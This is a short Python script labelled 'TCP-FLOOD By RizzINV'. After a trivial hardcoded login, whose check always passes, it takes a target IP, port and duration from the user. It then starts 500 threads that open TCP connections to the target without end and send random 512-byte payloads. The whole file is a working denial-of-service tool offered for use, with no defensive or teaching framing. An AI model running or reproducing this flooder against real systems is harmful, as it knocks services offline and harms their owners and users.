import os
import time
import threading
import socket
import random

userw = "kayy"
pasw = "rizzganteng"

for i in range(3):
    print("[User]")
    user = input("--->")
    print("╔══[PASSWORD]")
    pwd = input("╚════>  ")
    j = 3
    if (pwd == pasw,user == userw):
        time.sleep(3)
        print("[Welcome User]")
        break
    else:
        time.sleep(2)
        print("[WRONG Account]")
        continue
time.sleep(2)
print("[Using Account Rizz]")
time.sleep(2)
os.system("clear")

logo = """
_///////                         _//_///     _//_//         _//        _//    _//   _/                  _//_/ _//   _// _//       _//.
_//    _//     _//// _//_//// _//_//_// _//  _//  _//     _//..
_/ _//      _//     _//      _// _//_//  _// _//   _//   _//...
_//  _//    _//   _//      _//   _//_//   _/ _//    _// _//....
_//    _//  _//  _//      _//    _//_//    _/ //     _////.....
_//      _//_//_////////_////////_//_//      _//      _//......
...............................................................        """
print(logo)
print("TCP-FLOOD By RizzINV")
ip = str(input("IP : "))
port = int(input("PORT : "))
times = int(input("TIME : "))
os.system("clear")

def tcpfl():
    rizz = random._urandom(512)
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip,port))
            sock.send(rizz)
            for x in range(times):
                sock.send(rizz)
            print(f"Sending Flood to > ip : {ip} port : ${port} | with time => {times}")
        except socket.error:
            print(f"Error Cant Connecting | ip : {ip} port : {port}")
            sock.close()
   
for x in range(500):
    t = threading.Thread(target=tcpfl)
    t.start()
